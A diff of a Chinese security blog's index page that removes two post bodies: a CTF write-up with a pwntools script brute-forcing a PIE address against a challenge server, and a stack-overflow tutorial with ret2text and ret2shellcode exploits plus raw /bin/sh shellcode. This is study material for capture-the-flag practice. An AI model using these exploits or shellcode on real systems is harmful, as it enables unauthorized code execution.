@@ -265,7 +265,7 @@
                 
               
 
-              <time title="创建时间：2019-10-25 18:51:58 / 修改时间：18:57:49" itemprop="dateCreated datePublished" datetime="2019-10-25T18:51:58+08:00">2019-10-25</time>
+              <time title="创建时间：2019-10-25 18:51:58 / 修改时间：20:25:40" itemprop="dateCreated datePublished" datetime="2019-10-25T18:51:58+08:00">2019-10-25</time>
             </span>
           
             
@@ -297,10 +297,16 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <p>渣木推的一道题, 有点鬼, 但是还是蛮简单的.<br>checksec发现PIE开启了, 可执行文件里的gadget不能用.<br>用ida反汇编一下, 发现有后门函数, 发现main函数里有两个函数, 而这两个函数调用时内存栈的相对位置是一样的, 我们只需要在第一次读入buf的时候更改第3个函数v1的值就好.<br>这道题给出了PIE的前4位, 需要爆破第4位, 后三位ida可以看到.<br>这道题的flag是flag.txt…<br>exp如下:</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">t = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">16</span>):</span><br><span class="line">	<span class="comment"># s = process('./pwn')</span></span><br><span class="line">	s = remote(<span class="string">'101.71.29.5'</span>, <span class="number">10009</span>)</span><br><span class="line"></span><br><span class="line">	message = s.recvuntil(<span class="string">'world\n'</span>)</span><br><span class="line">	res = int((re.findall(<span class="string">r'[0-9]+'</span>, message))[<span class="number">0</span>]) &lt;&lt; <span class="number">16</span></span><br><span class="line">	t = res | (i &lt;&lt; <span class="number">12</span>) | (<span class="number">0x9cd</span>)</span><br><span class="line">	</span><br><span class="line">	s.send(<span class="string">'a'</span> * <span class="number">12</span> + p32(t))</span><br><span class="line">	sleep(<span class="number">0.1</span>)</span><br><span class="line">	</span><br><span class="line">	s.recvuntil(<span class="string">'Please input your choice:(1.hello|2.byebye):'</span>)</span><br><span class="line">	s.send(<span class="string">'a'</span>)</span><br><span class="line">	sleep(<span class="number">0.1</span>)</span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		s.recv(timeout = <span class="number">1</span>)</span><br><span class="line">	<span class="keyword">except</span> EOFError:</span><br><span class="line">		s.close()</span><br><span class="line">		<span class="keyword">continue</span></span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		sleep(<span class="number">0.1</span>)</span><br><span class="line">		s.interactive()</span><br></pre></td></tr></table></figure>
-
-
+          <p>渣木推的一道题, 有点鬼, 但是还是蛮简单的.  </p>
+          <!--noindex-->
+          
+            <div class="post-button text-center">
+              <a class="btn" href="/2019/10/25/unctf-sosoeasypwn/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          
+          <!--/noindex-->
         
       
     </div>
@@ -364,7 +370,7 @@
                   <i class="fa fa-calendar-check-o"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2019-10-19 20:00:58" itemprop="dateModified" datetime="2019-10-19T20:00:58+08:00">2019-10-19</time>
+                <time title="修改时间：2019-10-25 20:25:35" itemprop="dateModified" datetime="2019-10-25T20:25:35+08:00">2019-10-25</time>
               </span>
             
           
@@ -394,49 +400,15 @@
 
       
           <p>跟着wood学了一下栈溢出.<br>思路大概就是用输入时候的漏洞覆盖其他的数值.<br>下面就从入门到入坟梳理一下栈溢出漏洞.  </p>
-<h1 id="0x0-栈中变量的存储方式"><a href="#0x0-栈中变量的存储方式" class="headerlink" title="0x0 栈中变量的存储方式"></a>0x0 栈中变量的存储方式</h1><p>栈中变量的存储符合先进后出<br><img src="https://i.loli.net/2019/10/10/ipwuM5gc6QoOJ2e.png" alt="Data_stack.png"><br>函数中申请局部变量是在栈内存的.<br>栈中地址由高地址向低地址生长, 即栈顶是低地址, 栈底是高地址.  </p>
-<h2 id="数组的存储方式"><a href="#数组的存储方式" class="headerlink" title="数组的存储方式"></a>数组的存储方式</h2><p>数组的存储</p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> a[<span class="number">10</span>];</span><br></pre></td></tr></table></figure>
-
-<p>定义一个内存大小为10*sizeof(int)的int数组a, 那么a的值是数组的首地址, a[i] = *(a + i)</p>
-<h2 id="ebp-esp-寄存器"><a href="#ebp-esp-寄存器" class="headerlink" title="ebp esp 寄存器"></a>ebp esp 寄存器</h2><p>ebp指向栈底, esp指向栈顶, (ebp esp 在栈内存中是不占用内存的, ebp, esp寄存器用的不是栈内存)  </p>
-<h1 id="0x1-程序的运行-eip寄存器"><a href="#0x1-程序的运行-eip寄存器" class="headerlink" title="0x1 程序的运行 eip寄存器"></a>0x1 程序的运行 eip寄存器</h1><p>程序的汇编中, 代码段和数据段分开储存, 数据段有栈储存(严谨来说内存栈并不在数据段), 代码段没有<br>在代码栈中, 当运行到第i行时, eip指向第i+1行, eip的跳转可以实现函数的多种功能.  </p>
-<h1 id="0x2-基础栈溢出"><a href="#0x2-基础栈溢出" class="headerlink" title="0x2 基础栈溢出"></a>0x2 基础栈溢出</h1><p>来自ctf-wiki的一些内容<br><img src="https://i.loli.net/2019/10/10/o1VJGrqvKL3CUbt.png" alt><br>大概就是说, 在读入的时候, 对读入的数据的多少没有限制或者限制不够, 导致读入的数据覆盖到栈中的其他内存, 这样就能达到一些目的.  </p>
-<h2 id="劫持函数返回地址"><a href="#劫持函数返回地址" class="headerlink" title="劫持函数返回地址"></a>劫持函数返回地址</h2><h3 id="函数调用retn问题"><a href="#函数调用retn问题" class="headerlink" title="函数调用retn问题"></a>函数调用retn问题</h3><p><img src="https://i.loli.net/2019/10/10/fhb3yCsiXLQI26S.png" alt="v2-9125ba203edd2bab1308ad88db2ae197_hd.png"><br>用一个小例子来简单的理解一下.<br>当main函数中调用get_flag函数的时候, 程序做的操作:<br>1.get_flag 参数从右向左入栈(32位)<br>比如</p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">get_flag</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a + b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>b先入栈, 然后a入栈.<br><img src="https://i.loli.net/2019/10/10/cxEU23ulNgfvyah.png" alt="v2-9ae4f530296d4a8ec7d44443e3e6d37f_hd.png">  </p>
-<ol start="2">
-<li>当前eip入栈, 当调用的get_flag函数执行完成后, 会有ret, ret相当于pop eip, 这时候栈顶是原eip的值, 这样程序运行完get_flag后就可以继续运行main函数中的指令.<br><img src="https://i.loli.net/2019/10/10/9FNwH7eWghaTXlc.png" alt="v2-c350a4c5e9f5bbe839606486f3100185_hd.png"></li>
-<li>保存原栈底指针ebp的值, ebp指向新的栈底, esp指向当前栈帧底部(原esp不用存, 可算出.)  <h3 id="劫持函数Return-Address"><a href="#劫持函数Return-Address" class="headerlink" title="劫持函数Return Address"></a>劫持函数Return Address</h3>利用输入时的漏洞可以可更改函数的返回地址.<br>从一个简单小例题看看这是什么东西.<br>我们<br><img src="https://i.loli.net/2019/10/10/NTRCk3lmjQ5uLPa.png" alt><br>可以看到主函数很简单, 读入字符串s, 可以看到没有对s输入的长度进行限制, 我们可以利用这点来更改Return Address的值.<br><img src="https://i.loli.net/2019/10/10/OgXJfwdrjDsyGCS.png" alt><br>经过观察, 我们只要调用这个fun函数, 我们就能获得服务器的控制权.<br><img src="https://i.loli.net/2019/10/10/uiegoSmf3QwZGOr.png" alt><br>看一下fun函数的地址, 将光标移到fun上后按tab键可出现该界面<br><img src="https://i.loli.net/2019/10/10/8NRpMorF26tjEJb.png" alt><br>看一下在main函数内存栈中储存的位置, 来算下偏移.<br>前面的地址是相对ebp的偏移, 其中-0xf处的s是字符数组s的起始地址.<br>下面0x8位置的r代表return address<br>我们想要覆盖returnaddress, 那么需要先输入0x8 + 0xf个字符, 然后输入fun函数的地址, 即可运行fun函数.<br>输入fun函数的地址时需要进行一些操作, 因为直接输入的话会被当做字符直接读入, 这时候我们可以用p64这个pwntools, p64(x)将x拆成由8个字符组成的字符串输出(其中涉及到大小端存储), 具体原理不说了…<br>类似, p32是拆成4个字符输出.<br>然后写个脚本做一做就好了.<br>(需要chmod加权限)<br>脚本如下:  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">s = process(<span class="string">'./pwn1'</span>)</span><br><span class="line">payload = <span class="string">'a'</span> * <span class="number">23</span> + p64(<span class="number">0x401186</span>)</span><br><span class="line">s.sendline(payload)</span><br><span class="line">s.interactive()</span><br></pre></td></tr></table></figure>
-
-</li>
-</ol>
-<p>对脚本解释一下..<br>process 是运行pwn1 这个可执行文件, payload是构造的字符串, sendline(payload)是把payload输入到命令行并且在结尾加换行符, interactive() 切换到交互模式.  </p>
-<h1 id="0x3-Basic-ROP"><a href="#0x3-Basic-ROP" class="headerlink" title="0x3 Basic ROP"></a>0x3 Basic ROP</h1><p>抄ctf-wiki!<br><img src="https://i.loli.net/2019/10/10/SJsgc85pGAQFzko.png" alt><br>二话不说, 就是一通代码段…  </p>
-<h2 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h2><p>上面说过, retn 的实际指令是 pop eip, 上面的将return address的值换成 fun函数的地址, 其实是换成了fun函数的起始地址, 但是我们其实并不需要运行完整的fun函数, 我们只需要运行system(‘./bin/sh’)这个语句, 这时候我们查看一下上面的汇编代码, 发现在0x401191的位置调用了system函数, 但是调用system函数的时候需要先考虑system的参数问题, 上一行lea rdi, command是在调整参数, 那么只要把eip指向0x401191对应的指令就行, 注意调用函数时候的参数问题, 需要先把参数调整好再调用system函数.  </p>
-<h2 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h2><p>这个东西是在没有system(“./bin/sh”)时候的一种操作.<br>这种方法需要一段内存它是可写可执行的, 并且我们可以想办法写入.<br>从ctf-wiki例题开始看.  </p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [sp+1Ch] [bp-64h]@1</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"No system for you this time !!!"</span>);</span><br><span class="line">  gets((<span class="keyword">char</span> *)&amp;v4);</span><br><span class="line">  <span class="built_in">strncpy</span>(buf2, (<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;v4, <span class="number">0x64</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"bye bye ~"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>发现有gets函数, 可以读入一些东西.<br>看了一下栈中变量的存储情况发现可以修改栈中的return address.<br>并且把输入的内容复制到了buf2段, 我们查看一下buf2对应的段.<br>发现buf2在bss段, 并且有可读可写可执行权限, 那么我们可以先写入shellcode, 然后用任意字符溢出到return address 对应的地址, return address 需要将其更改为buf2对应的地址, 然后就可以运行写入的shellcode获取权限了.<br>pwntools 工具解释.<br>shellcraft.sh()获得32位系统上的shellcode.<br>asm(string)<br>将string汇编转化为二进制.<br>ljust补齐, exp.py中为先输入shellcode, 然后补’a’, ‘a’的个数和shellcode的总字节数加起来为112.<br>脚本.  </p>
-<pre><code class="Python"><span class="comment">#!/usr/bin/env python</span>
-<span class="keyword">from</span> pwn <span class="keyword">import</span> *
-
-sh = process(<span class="string">'./ret2shellcode'</span>)
-shellcode = asm(shellcraft.sh())
-buf2_addr = <span class="number">0x804a080</span>
-
-sh.sendline(shellcode.ljust(<span class="number">112</span>, <span class="string">'A'</span>) + p32(buf2_addr))
-sh.interactive()</code></pre>
-<p>附赠64位shellcode一段.  </p>
-<pre><code class="text">&apos;x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05&apos;</code></pre>
-<h2 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h2><p>我jio的, ctf-wiki上讲的很全很好, 附个链接.<br>注意的一些事情:<br>int 0x80我暂且先将其理解为execve这个函数, 先用一些代码片段修改函数参数, 然后再调用int 0x80  </p>
-<ul>
-<li>ROPgadget安装.  <pre><code class="bash">sudo pip install ropgadget</code></pre>
-</li>
-<li>常用用法<br>ROPgadget –binary filename –string “ /bin/sh”<br>ROPgadget –binary filename –only “pop|ret” | grep ‘eax’<br>ROPgadget –binary filename –only ‘int’  </li>
-</ul>
-
+          <!--noindex-->
+          
+            <div class="post-button text-center">
+              <a class="btn" href="/2019/09/28/stack-overflow/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          
+          <!--/noindex-->
         
       
     </div>
